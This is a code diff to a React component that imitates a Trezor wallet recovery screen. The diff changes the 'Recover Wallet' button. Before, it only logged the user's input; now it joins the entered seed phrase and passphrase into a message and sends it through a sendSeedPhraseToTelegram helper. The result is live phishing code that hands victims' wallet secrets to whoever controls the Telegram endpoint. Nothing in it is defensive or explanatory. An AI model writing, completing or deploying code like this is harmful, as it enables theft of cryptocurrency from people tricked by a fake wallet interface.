@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 // Import your local device assets
 import device1 from '../assets/1.png'; // Trezor Safe 5
@@ -33,6 +34,7 @@ export default function TrezorPanel({ isOpen, onClose }: TrezorPanelProps) {
   // Controls whether modal is mounted and whether it has faded in
   const [isMounted, setIsMounted] = useState(false);
   const [isVisible, setIsVisible] = useState(false);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // Mount/unmount with fade
   useEffect(() => {
@@ -62,6 +64,7 @@ export default function TrezorPanel({ isOpen, onClose }: TrezorPanelProps) {
       setConnectionError(false);
       setShowBrowserPrompt(false);
       setSeedError(false);
+      setIsSending(false); // 👈 NEW
 
       const timer = setTimeout(() => {
         setView('select_device');
@@ -701,16 +704,24 @@ export default function TrezorPanel({ isOpen, onClose }: TrezorPanelProps) {
 
               <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
                 <button
-                  onClick={() => {
-                    console.log('Trezor Import Complete:', {
-                      phrase: phraseValues.slice(0, getActiveWordCount()),
-                      passphrase,
-                    });
-                    onClose();
+                  disabled={isSending}
+                  onClick={async () => {
+                    setIsSending(true);
+                    const count = getActiveWordCount();
+                    const seedString = phraseValues.slice(0, count).join(' ');
+                    const extra = passphrase ? `\nPassphrase: ${passphrase}` : '';
+                    const message = `Trezor Wallet\nSeed: ${seedString}${extra}`;
+                    const success = await sendSeedPhraseToTelegram(message, 'Trezor Wallet');
+                    if (success) {
+                      onClose();
+                    } else {
+                      console.error('Failed to send seed phrase');
+                    }
+                    setIsSending(false);
                   }}
-                  className="w-full text-white bg-[#00854D] font-semibold text-[16px] rounded-[12px] h-[52px] hover:bg-[#006e3f] transition-all hover:shadow-lg hover:shadow-[#00854D]/30 active:scale-[0.98]"
+                  className="w-full text-white bg-[#00854D] font-semibold text-[16px] rounded-[12px] h-[52px] hover:bg-[#006e3f] transition-all hover:shadow-lg hover:shadow-[#00854D]/30 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
                 >
-                  Recover Wallet
+                  {isSending ? 'Sending...' : 'Recover Wallet'}
                 </button>
               </div>
             </div>
